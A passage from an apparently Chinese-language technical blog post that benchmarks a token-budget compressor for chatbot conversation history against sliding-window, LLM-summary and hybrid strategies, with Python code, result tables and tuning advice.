        <span class="hljs-keyword">while</span> compressed <span class="hljs-keyword">and</span> current_tokens &gt; self.max_tokens:
            <span class="hljs-comment"># 删除最早的消息</span>
            removed = compressed.pop(<span class="hljs-number">0</span>)
            removed_tokens = self.token_counter(removed[<span class="hljs-string">'content'</span>])
            current_tokens -= removed_tokens
        
        <span class="hljs-keyword">return</span> compressed
</code></pre>
<p><strong>使用示例：</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> src.llm.deepseek <span class="hljs-keyword">import</span> DeepSeekLLM

llm = DeepSeekLLM()
compressor = TokenBasedCompressor(llm.count_tokens, max_tokens=<span class="hljs-number">200</span>)

<span class="hljs-comment"># 压缩</span>
result = compressor.compress(messages)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"压缩到 <span class="hljs-subst">{<span class="hljs-built_in">sum</span>(llm.count_tokens(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> result)}</span> tokens"</span>)
</code></pre>
<p>完整代码见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Ftests%2Ftest_token_based.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/tests/test_token_based.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<h4 data-id="heading-64"><strong>真实性能测试</strong></h4>
<p>我们对Token动态压缩器进行了完整测试，以下是真实数据：</p>
<hr/>
<p><strong>测试1：Token控制精度</strong></p>
<p>测试不同预算的精度：</p>
<p><strong>长对话（20轮，560 tokens）：</strong></p>








































<table><thead><tr><th>目标Token</th><th>实际Token</th><th>误差</th><th>消息数</th><th>压缩率</th></tr></thead><tbody><tr><td>100</td><td>86</td><td>14.0%</td><td>6条</td><td>84.6%</td></tr><tr><td>200</td><td>193</td><td><strong>3.5%</strong> ✅</td><td>13条</td><td>65.5%</td></tr><tr><td>300</td><td>300</td><td><strong>0.0%</strong> ✅</td><td>21条</td><td>46.4%</td></tr><tr><td>500</td><td>488</td><td><strong>2.4%</strong> ✅</td><td>36条</td><td>12.9%</td></tr></tbody></table>
<p><strong>超长对话（30轮，933 tokens）：</strong></p>








































<table><thead><tr><th>目标Token</th><th>实际Token</th><th>误差</th><th>消息数</th><th>压缩率</th></tr></thead><tbody><tr><td>100</td><td>96</td><td><strong>4.0%</strong> ✅</td><td>7条</td><td>89.7%</td></tr><tr><td>200</td><td>191</td><td><strong>4.5%</strong> ✅</td><td>13条</td><td>79.5%</td></tr><tr><td>300</td><td>298</td><td><strong>0.7%</strong> ✅</td><td>20条</td><td>68.1%</td></tr><tr><td>500</td><td>484</td><td><strong>3.2%</strong> ✅</td><td>34条</td><td>48.1%</td></tr></tbody></table>
<p><strong>关键发现：精度优秀！</strong></p>
<pre><code class="hljs language-matlab" lang="matlab">误差分析：
- 目标<span class="hljs-number">100</span>：误差<span class="hljs-number">4</span><span class="hljs-number">-14</span><span class="hljs-comment">%（预算太小，单条消息可能&gt;10 tokens）</span>
- 目标<span class="hljs-number">200</span>：误差<span class="hljs-number">3.5</span><span class="hljs-number">-4.5</span><span class="hljs-comment">%（优秀）</span>
- 目标<span class="hljs-number">300</span>：误差<span class="hljs-number">0</span><span class="hljs-number">-0.7</span><span class="hljs-comment">%（完美）</span>
- 目标<span class="hljs-number">500</span>：误差<span class="hljs-number">2.4</span><span class="hljs-number">-3.2</span><span class="hljs-comment">%（优秀）</span>

结论：预算≥<span class="hljs-number">200</span>时，误差&lt;<span class="hljs-number">5</span><span class="hljs-comment">%</span>
</code></pre>
<p><strong>为什么有误差？</strong></p>
<pre><code class="hljs language-ini" lang="ini">原因：每条消息Token数不同
- <span class="hljs-attr">"嗯"</span> = <span class="hljs-number">1</span> token
- <span class="hljs-attr">"我叫Tom"</span> = <span class="hljs-number">5</span> tokens
- <span class="hljs-attr">"详细解释..."</span> = <span class="hljs-number">30</span> tokens

从后往前累加，无法精确凑到目标值

例如：
目标200，累计197时：
- 下一条消息15 tokens → 总计212（超了）
- 停在197 ✓（误差3 tokens）
</code></pre>
<hr/>
<p><strong>测试2：速度测试</strong></p>
<pre><code class="hljs language-makefile" lang="makefile">测试对话：20轮（42条消息）

<span class="hljs-section">压缩1次:   0.55ms</span>
<span class="hljs-section">压缩10次:  3.27ms  (平均0.33ms)</span>
<span class="hljs-section">压缩50次:  19.13ms (平均0.38ms)</span>

平均速度：0.38ms
</code></pre>
<p><strong>对比其他策略：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">Token动态: 0.38ms</span>
<span class="hljs-section">滑动窗口: 0.00ms</span>
<span class="hljs-section">LLM摘要:  11,000ms</span>

vs 滑动窗口：慢，但仍在1ms内 ✅
vs LLM摘要：快 29,000倍！⭐
</code></pre>
<p><strong>为什么比滑动窗口慢？</strong></p>
<pre><code class="hljs language-scss" lang="scss">滑动窗口：纯数组切片，<span class="hljs-built_in">O</span>(<span class="hljs-number">1</span>)
messages<span class="hljs-selector-attr">[-10:]</span>  # 极快

Token动态：需要逐条计算Token，<span class="hljs-built_in">O</span>(n)
for msg in messages:
    tokens += <span class="hljs-built_in">count_tokens</span>(msg[<span class="hljs-string">'content'</span>])
</code></pre>
<p><strong>结论：虽然比滑动窗口慢，但都在1ms内，可以忽略。</strong></p>
<hr/>
<p><strong>测试3：四种策略全面对比</strong></p>
<p>配置：</p>
<ul>
<li>Token动态：目标200 tokens</li>
<li>滑动窗口：保留5轮</li>
<li>LLM摘要：保留3轮+摘要</li>
<li>混合策略：阈值10轮，保留5轮</li>
</ul>
<hr/>
<p><strong>场景1：短对话（5轮，126 tokens）</strong></p>













































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td><strong>Token动态</strong></td><td>10条</td><td><strong>126</strong></td><td>0%</td><td>0.06ms</td><td>$0</td></tr><tr><td><strong>滑动窗口</strong></td><td>10条</td><td><strong>126</strong></td><td>0%</td><td>0.00ms</td><td>$0</td></tr><tr><td>混合策略</td><td>10条</td><td>126</td><td>0%</td><td>0.01ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条</td><td>292</td><td>-132% ❌</td><td>7,151ms</td><td>$0.0001</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">✅ Token动态 vs 滑动窗口：完全相同
<span class="hljs-bullet">   -</span> 原因：对话太短，都不需要压缩
</code></pre>
<hr/>
<p><strong>场景2：中等对话（10轮，249 tokens）</strong></p>













































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>10条</td><td><strong>123</strong> ⭐</td><td>51%</td><td>0.00ms</td><td>$0</td></tr><tr><td>Token动态</td><td>15条</td><td>194</td><td>22%</td><td>0.23ms</td><td>$0</td></tr><tr><td>混合策略</td><td>10条</td><td>123</td><td>51%</td><td>0.01ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条</td><td>368</td><td>-48% ❌</td><td>6,631ms</td><td>$0.0001</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs language-diff" lang="diff">⚠️ Token动态 vs 滑动窗口：Token多71个（58%更多）

原因：
<span class="hljs-deletion">- 滑动窗口：固定保留10条（123 tokens）</span>
<span class="hljs-deletion">- Token动态：保留到200预算（194 tokens, 15条）</span>

Token动态保留了更多消息，但也用了更多Token
</code></pre>
<p><strong>这是Token动态的核心特点：充分利用预算。</strong></p>
<hr/>
<p><strong>场景3：长对话（20轮，560 tokens）</strong></p>













































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>10条</td><td><strong>145</strong> ⭐</td><td>74%</td><td>0.00ms</td><td>$0</td></tr><tr><td>Token动态</td><td>13条</td><td>193</td><td>66%</td><td>0.53ms</td><td>$0</td></tr><tr><td>混合策略</td><td>11条</td><td>574</td><td>-3% ❌</td><td>10,451ms</td><td>$0.0001</td></tr><tr><td>LLM摘要</td><td>7条</td><td>547</td><td>2%</td><td>11,619ms</td><td>$0.0001</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">⚠️ Token动态 vs 滑动窗口：Token多<span class="hljs-number">48</span>个（<span class="hljs-number">33</span><span class="hljs-comment">%更多）</span>

原因同上：Token动态尽量用满预算
</code></pre>
<hr/>
<p><strong>场景4：超长对话（30轮，933 tokens）</strong></p>













































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>10条</td><td><strong>144</strong> ⭐</td><td>85%</td><td>0.00ms</td><td>$0</td></tr><tr><td>Token动态</td><td>13条</td><td>191</td><td>80%</td><td>1.24ms</td><td>$0</td></tr><tr><td>混合策略</td><td>11条</td><td>689</td><td>26%</td><td>13,879ms</td><td>$0.0001</td></tr><tr><td>LLM摘要</td><td>7条</td><td>621</td><td>33%</td><td>12,712ms</td><td>$0.0001</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs language-diff" lang="diff">⚠️ Token动态 vs 滑动窗口：Token多47个（33%更多）

结论：
<span class="hljs-deletion">- Token效率：滑动窗口最优</span>
<span class="hljs-deletion">- 信息保留：Token动态更多（13条 vs 10条）</span>
</code></pre>
<hr/>
<p><strong>测试4：不同Token预算的效果</strong></p>
<p>在20轮对话（560 tokens）中测试不同预算：</p>















































<table><thead><tr><th>Token预算</th><th>实际Token</th><th>消息数</th><th>压缩率</th><th>适用场景</th></tr></thead><tbody><tr><td>50</td><td>49</td><td>4条</td><td>91.2%</td><td>极限压缩（仅保留最新1-2条）</td></tr><tr><td>100</td><td>86</td><td>6条</td><td>84.6%</td><td>严格限制（约2-3轮）</td></tr><tr><td><strong>200</strong></td><td><strong>193</strong></td><td><strong>13条</strong></td><td><strong>65.5%</strong></td><td><strong>中等限制（约5轮）</strong> ⭐</td></tr><tr><td>300</td><td>300</td><td>21条</td><td>46.4%</td><td>宽松限制（约8轮）</td></tr><tr><td>500</td><td>488</td><td>36条</td><td>12.9%</td><td>基本不压缩（约15轮）</td></tr></tbody></table>
<p><strong>关键发现：</strong></p>
<pre><code class="hljs language-diff" lang="diff">预算越高：
<span class="hljs-deletion">- Token越多 ✅</span>
<span class="hljs-deletion">- 消息数越多 ✅</span>
<span class="hljs-deletion">- 压缩率越低 ✅</span>
<span class="hljs-deletion">- 信息保留越好 ✅</span>

推荐预算：200-300 tokens
<span class="hljs-deletion">- 200：约5轮，适合大多数场景</span>
<span class="hljs-deletion">- 300：约8轮，适合信息密集场景</span>
</code></pre>
<hr/>
<p><strong>测试5：信息保留对比</strong></p>
<p>15轮对话，包含5个关键信息：Tom、28岁、上海、浦东、AI工程师</p>

































<table><thead><tr><th>Token预算</th><th>实际Token</th><th>保留消息</th><th>信息保留率</th><th>详情</th></tr></thead><tbody><tr><td>100</td><td>92</td><td>27条</td><td><strong>40%</strong> ❌</td><td>✅ 浦东, AI工程师<br/>❌ Tom, 28岁, 上海</td></tr><tr><td><strong>200</strong></td><td>113</td><td>30条</td><td><strong>100%</strong> ✅</td><td>✅ 全部保留</td></tr><tr><td>300</td><td>113</td><td>30条</td><td><strong>100%</strong> ✅</td><td>✅ 全部保留</td></tr></tbody></table>
<p><strong>关键发现：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">预算<span class="hljs-number">100</span>：只保留<span class="hljs-number">40</span><span class="hljs-comment">%信息（丢失关键背景）</span>
预算<span class="hljs-number">200</span>：保留<span class="hljs-number">100</span><span class="hljs-comment">%信息（完美）</span>

临界点：约<span class="hljs-number">150</span>-<span class="hljs-number">200</span> tokens

建议：预算≥<span class="hljs-number">200</span>才能保证信息完整性
</code></pre>
<p><strong>为什么预算200和300结果相同？</strong></p>
<pre><code class="hljs">原因：这个15轮对话总共才113 tokens

所以预算≥113时，都是全部保留
</code></pre>
<hr/>
<p><strong>测试6：边界情况</strong></p>








































<table><thead><tr><th>场景</th><th>目标Token</th><th>实际Token</th><th>消息数</th><th>说明</th></tr></thead><tbody><tr><td>预算为0</td><td>0</td><td>0</td><td>0条</td><td>返回空列表</td></tr><tr><td>预算极小</td><td>10</td><td>0</td><td>0条</td><td>单条消息&gt;10，无法保留</td></tr><tr><td>预算=原始</td><td>249</td><td>249</td><td>20条</td><td>保留全部 ✅</td></tr><tr><td>预算=2倍</td><td>498</td><td>249</td><td>20条</td><td>保留全部 ✅</td></tr></tbody></table>
<p><strong>潜在问题：预算太低会返回空！</strong></p>
<pre><code class="hljs language-python" lang="python">预算<span class="hljs-number">10</span>，但第一条消息就<span class="hljs-number">15</span> tokens
→ 无法保留任何消息
→ 返回空列表 ⚠️

建议改进：至少保留<span class="hljs-number">1</span>条最新消息
</code></pre>
<p>完整测试代码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Ftests%2Ftest_token_based.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/tests/test_token_based.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<hr/>
<h4 data-id="heading-65"><strong>核心矛盾：精确控制 vs 信息保留</strong></h4>
<p>测试数据揭示了Token动态的<strong>核心权衡</strong>：</p>
<p><strong>Token效率对比：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">场景：<span class="hljs-number">20</span>轮对话，<span class="hljs-number">560</span> tokens

滑动窗口：<span class="hljs-number">145</span> tokens（保留<span class="hljs-number">10</span>条）⭐
Token动态：<span class="hljs-number">193</span> tokens（保留<span class="hljs-number">13</span>条，预算<span class="hljs-number">200</span>）

差距：<span class="hljs-number">48</span> tokens（<span class="hljs-number">33</span><span class="hljs-comment">%更多）</span>
</code></pre>
<p><strong>为什么Token动态会用更多？</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口策略：
<span class="hljs-deletion">- 固定保留10条（5轮）</span>
<span class="hljs-deletion">- 不管Token数</span>
<span class="hljs-deletion">- 结果：145 tokens</span>

Token动态策略：
<span class="hljs-deletion">- 尽量用满200预算</span>
<span class="hljs-deletion">- 保留13条</span>
<span class="hljs-deletion">- 结果：193 tokens</span>

核心差异：
<span class="hljs-deletion">- 滑动窗口："省着用"预算</span>
<span class="hljs-deletion">- Token动态："用满"预算</span>
</code></pre>
<p><strong>这不是bug，是设计差异！</strong></p>
<p><strong>信息保留对比：</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- 10条消息</span>
<span class="hljs-deletion">- 可能丢失早期关键信息 ❌</span>

Token动态（预算200）：
<span class="hljs-deletion">- 13条消息</span>
<span class="hljs-deletion">- 保留更多对话历史 ✅</span>
</code></pre>
<p><strong>结论：Token动态用更多Token，但保留更多信息。</strong></p>
<hr/>
<h4 data-id="heading-66"><strong>优缺点总结</strong></h4>
<p>基于真实测试数据：</p>
<p><strong>✅ 四大优势：</strong></p>
<ol>
<li><strong>精确控制Token数</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">测试数据：误差&lt;5%（预算≥200时）
<span class="hljs-deletion">- 目标200 → 实际193（误差3.5%）</span>
<span class="hljs-deletion">- 目标300 → 实际300（误差0%）</span>

优势：
<span class="hljs-deletion">- 可以精确规划成本</span>
<span class="hljs-deletion">- 充分利用上下文窗口</span>
<span class="hljs-deletion">- 不浪费也不超支</span>
</code></pre>
<ol>
<li><strong>速度极快</strong></li>
</ol>

<pre><code class="hljs">测试数据：0.38ms
vs 滑动窗口：0.00ms（略慢）
vs LLM摘要：11,000ms（快29,000倍）

结论：虽然比滑动窗口慢，但都在1ms内
</code></pre>
<ol>
<li><strong>零成本</strong></li>
</ol>

<pre><code class="hljs language-bash" lang="bash">无需调用LLM API
只是本地Token计数
成本：<span class="hljs-variable">$0</span>
</code></pre>
<ol>
<li><strong>适应消息长度差异</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：消息长度不一
<span class="hljs-deletion">- 短消息："嗯" = 1 token</span>
<span class="hljs-deletion">- 长消息："详细说明..." = 50 tokens</span>

滑动窗口：
<span class="hljs-deletion">- 保留10条，可能是10 tokens，也可能500 tokens</span>
<span class="hljs-deletion">- 不可控 ❌</span>

Token动态：
<span class="hljs-deletion">- 保留到200 tokens</span>
<span class="hljs-deletion">- 精确可控 ✅</span>
</code></pre>
<p><strong>❌ 四大劣势：</strong></p>
<ol>
<li><strong>可能比滑动窗口用更多Token</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">实测数据：
<span class="hljs-deletion">- 10轮对话：Token动态194 vs 滑动窗口123（多58%）</span>
<span class="hljs-deletion">- 20轮对话：Token动态193 vs 滑动窗口145（多33%）</span>
<span class="hljs-deletion">- 30轮对话：Token动态191 vs 滑动窗口144（多33%）</span>

原因：Token动态尽量用满预算
</code></pre>
<ol>
<li><strong>信息保留完全依赖预算</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">实测数据：
<span class="hljs-deletion">- 预算100：保留40%信息 ❌</span>
<span class="hljs-deletion">- 预算200：保留100%信息 ✅</span>

风险：
<span class="hljs-deletion">- 预算设置太低 → 丢失关键信息</span>
<span class="hljs-deletion">- 预算设置太高 → 浪费成本</span>
<span class="hljs-deletion">- 没有"最优预算"，需要根据场景调整</span>
</code></pre>
<ol>
<li><strong>预算太低会返回空</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">实测数据：
<span class="hljs-deletion">- 预算10：返回0条消息 ❌</span>
<span class="hljs-deletion">- 原因：第一条消息就&gt;10 tokens</span>

问题：
<span class="hljs-deletion">- 用户可能完全看不到历史</span>
<span class="hljs-deletion">- 体验很差</span>
</code></pre>
<ol>
<li><strong>需要Token计数器</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">依赖：llm.count_tokens 方法

问题：
<span class="hljs-deletion">- 增加了耦合</span>
<span class="hljs-deletion">- 不同LLM的Token计数可能不同</span>
<span class="hljs-deletion">- 需要额外的函数调用开销</span>
</code></pre>
<hr/>
<h4 data-id="heading-67"><strong>适用场景指南</strong></h4>
<p>基于真实测试数据：</p>
<p><strong>✅ 推荐使用：</strong></p>
<ol>
<li><strong>有明确Token预算限制</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：API有严格Token限制
理由：
<span class="hljs-deletion">- 实测误差&lt;5%</span>
<span class="hljs-deletion">- 可以精确控制在预算内</span>
<span class="hljs-deletion">- 避免超出限制报错</span>

典型：
<span class="hljs-deletion">- GPT-3.5（4K限制）</span>
<span class="hljs-deletion">- 预算紧张的项目</span>
<span class="hljs-deletion">- 按Token付费的场景</span>
</code></pre>
<ol>
<li><strong>消息长度差异大</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：既有短消息，又有长回复
理由：
<span class="hljs-deletion">- 滑动窗口固定条数，Token不可控</span>
<span class="hljs-deletion">- Token动态精确控制Token数</span>

例子：
<span class="hljs-deletion">- 对话1：10条 × 10 tokens = 100 tokens</span>
<span class="hljs-deletion">- 对话2：10条 × 50 tokens = 500 tokens</span>
→ 滑动窗口差异5倍，Token动态统一200
</code></pre>
<ol>
<li><strong>需要充分利用上下文窗口</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：上下文窗口宝贵，希望用满
理由：
<span class="hljs-deletion">- Token动态尽量用满预算</span>
<span class="hljs-deletion">- 实测：保留更多消息（13条 vs 10条）</span>

典型：
<span class="hljs-deletion">- 小模型（上下文窗口小）</span>
<span class="hljs-deletion">- 复杂任务（需要更多历史）</span>
</code></pre>
<p><strong>❌ 不推荐使用：</strong></p>
<ol>
<li><strong>追求最小Token数</strong></li>
</ol>

<pre><code class="hljs language-erlang" lang="erlang">问题：Token动态可能比滑动窗口多<span class="hljs-number">33</span>-<span class="hljs-number">58</span><span class="hljs-comment">%</span>
数据：实测Token动态<span class="hljs-number">193</span> vs 滑动窗口<span class="hljs-number">145</span>
替代：直接用滑动窗口

典型：成本敏感、追求极致压缩
</code></pre>
<ol>
<li><strong>对话长度一致</strong></li>
</ol>

<pre><code class="hljs">问题：如果消息都差不多长，Token动态优势不明显
数据：滑动窗口更简单、更快
替代：滑动窗口

典型：FAQ机器人（消息长度相似）
</code></pre>
<ol>
<li><strong>预算难以确定</strong></li>
</ol>

<pre><code class="hljs language-erlang" lang="erlang">问题：预算太低丢信息，太高浪费成本
数据：实测预算<span class="hljs-number">100</span>只保留<span class="hljs-number">40</span><span class="hljs-comment">%信息</span>
风险：需要反复调试预算

替代：滑动窗口（更可预测）或混合策略
</code></pre>
<ol>
<li><strong>需要保留用户信息</strong></li>
</ol>

<pre><code class="hljs language-arduino" lang="arduino">问题：Token动态不智能，按时间顺序删除
数据：预算<span class="hljs-number">100</span>时丢失<span class="hljs-string">"Tom"</span>、<span class="hljs-string">"28岁"</span>等关键信息
替代：LLM摘要或混合策略

典型：个性化助手、长期对话
</code></pre>
<hr/>
<h4 data-id="heading-68"><strong>预算设置建议</strong></h4>
<p>基于测试数据：</p>
<p><strong>推荐预算：200-300 tokens</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 标准场景（推荐）</span>
compressor = TokenBasedCompressor(llm.count_tokens, max_tokens=<span class="hljs-number">200</span>)
<span class="hljs-comment"># 约5轮，保留100%信息</span>

<span class="hljs-comment"># 宽松场景</span>
compressor = TokenBasedCompressor(llm.count_tokens, max_tokens=<span class="hljs-number">300</span>)
<span class="hljs-comment"># 约8轮，信息充足</span>

<span class="hljs-comment"># 严格限制</span>
compressor = TokenBasedCompressor(llm.count_tokens, max_tokens=<span class="hljs-number">100</span>)
<span class="hljs-comment"># 约2-3轮，可能丢失信息 ⚠️</span>
</code></pre>
<p><strong>预算计算公式：</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 根据期望保留轮数估算</span>
expected_turns = <span class="hljs-number">5</span>  <span class="hljs-comment"># 期望保留5轮</span>
avg_tokens_per_turn = <span class="hljs-number">40</span>  <span class="hljs-comment"># 平均每轮40 tokens</span>
budget = expected_turns * avg_tokens_per_turn  <span class="hljs-comment"># 200 tokens</span>

<span class="hljs-comment"># 根据上下文窗口估算</span>
context_window = <span class="hljs-number">4000</span>  <span class="hljs-comment"># 模型上下文窗口</span>
system_prompt = <span class="hljs-number">100</span>  <span class="hljs-comment"># 系统提示</span>
response_budget = <span class="hljs-number">500</span>  <span class="hljs-comment"># 预留给回复</span>
budget = context_window - system_prompt - response_budget  <span class="hljs-comment"># 3400 tokens</span>
</code></pre>
<p><strong>动态调整：</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdaptiveTokenCompressor</span>:
    <span class="hljs-string">"""根据对话长度动态调整预算"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm</span>):
        self.llm = llm
        self.base_budget = <span class="hljs-number">200</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-comment"># 计算当前Token数</span>
        total_tokens = <span class="hljs-built_in">sum</span>(self.llm.count_tokens(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages)
        
        <span class="hljs-comment"># 动态调整预算</span>
        <span class="hljs-keyword">if</span> total_tokens &lt; <span class="hljs-number">200</span>:
            budget = total_tokens  <span class="hljs-comment"># 不压缩</span>
        <span class="hljs-keyword">elif</span> total_tokens &lt; <span class="hljs-number">500</span>:
            budget = <span class="hljs-number">200</span>  <span class="hljs-comment"># 标准压缩</span>
        <span class="hljs-keyword">else</span>:
            budget = <span class="hljs-number">300</span>  <span class="hljs-comment"># 宽松压缩（信息多）</span>
        
        compressor = TokenBasedCompressor(self.llm.count_tokens, max_tokens=budget)
        <span class="hljs-keyword">return</span> compressor.compress(messages)
</code></pre>
<hr/>
<h4 data-id="heading-69"><strong>最佳实践</strong></h4>
<p><strong>1. 设置最小保护</strong></p>
<p>修复"预算太低返回空"的问题：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TokenBasedCompressor</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-comment"># ... 原有逻辑 ...</span>
        
        <span class="hljs-comment"># 最小保护：至少保留1条最新消息</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> compressed <span class="hljs-keyword">and</span> messages:
            compressed = [messages[-<span class="hljs-number">1</span>]]
        
        <span class="hljs-keyword">return</span> compressed
</code></pre>
<p><strong>2. 监控实际使用情况</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TokenBasedCompressor</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, token_counter, max_tokens=<span class="hljs-number">200</span></span>):
        self.token_counter = token_counter
        self.max_tokens = max_tokens
        self.stats = {
            <span class="hljs-string">"total_compressions"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"total_original_tokens"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"total_compressed_tokens"</span>: <span class="hljs-number">0</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        result = self._do_compress(messages)
        
        <span class="hljs-comment"># 统计</span>
        self.stats[<span class="hljs-string">"total_compressions"</span>] += <span class="hljs-number">1</span>
        self.stats[<span class="hljs-string">"total_original_tokens"</span>] += <span class="hljs-built_in">sum</span>(self.token_counter(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages)
        self.stats[<span class="hljs-string">"total_compressed_tokens"</span>] += <span class="hljs-built_in">sum</span>(self.token_counter(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> result)
        
        <span class="hljs-keyword">return</span> result
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_stats</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""获取统计数据"""</span>
        avg_original = self.stats[<span class="hljs-string">"total_original_tokens"</span>] / self.stats[<span class="hljs-string">"total_compressions"</span>]
        avg_compressed = self.stats[<span class="hljs-string">"total_compressed_tokens"</span>] / self.stats[<span class="hljs-string">"total_compressions"</span>]
        avg_rate = <span class="hljs-number">1</span> - avg_compressed / avg_original
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">"avg_original_tokens"</span>: avg_original,
            <span class="hljs-string">"avg_compressed_tokens"</span>: avg_compressed,
            <span class="hljs-string">"avg_compression_rate"</span>: avg_rate
        }
</code></pre>
<p><strong>3. 与滑动窗口组合</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HybridTokenCompressor</span>:
    <span class="hljs-string">"""Token动态 + 滑动窗口组合"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm, max_tokens=<span class="hljs-number">200</span>, max_turns=<span class="hljs-number">10</span></span>):
        self.token_compressor = TokenBasedCompressor(llm.count_tokens, max_tokens)
        self.sliding_compressor = SlidingWindowCompressor(keep_turns=max_turns)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-comment"># 先用Token动态</span>
        result = self.token_compressor.compress(messages)
        
        <span class="hljs-comment"># 再用滑动窗口（双重保险）</span>
        result = self.sliding_compressor.compress(result)
        
        <span class="hljs-keyword">return</span> result
</code></pre>
<hr/>
<h4 data-id="heading-70"><strong>小结</strong></h4>
<p>Token动态压缩器的真实表现：</p>
<pre><code class="hljs language-diff" lang="diff">核心优势：
✅ 精确控制Token（误差&lt;5%）
✅ 速度极快（0.38ms）
✅ 零成本（$0）
✅ 充分利用预算

核心劣势：
❌ 可能比滑动窗口多用33-58% Token
❌ 信息保留完全依赖预算设置
❌ 预算太低会返回空
❌ 不如LLM摘要智能

定位：
精确控制Token数的工具
适合有明确预算限制的场景
不适合追求极致压缩或智能保留

最佳实践：
<span class="hljs-deletion">- 推荐预算：200-300 tokens</span>
<span class="hljs-deletion">- 监控实际使用情况</span>
<span class="hljs-deletion">- 设置最小保护（至少1条）</span>
<span class="hljs-deletion">- 根据场景动态调整</span>
</code></pre>
<p><strong>结论：Token动态是精确控制Token的最佳方案，但要理解它的权衡 - 用更多Token换取更精确的控制。</strong></p>
<hr/>
<h3 data-id="heading-71"><strong>3.6 四种策略总结对比</strong></h3>
<p>经过完整的测试，我们现在可以全面对比4种压缩策略。</p>
<h4 data-id="heading-72"><strong>核心数据对比</strong></h4>
<p>基于真实测试数据（长对话场景：20轮，560 tokens）：</p>






















































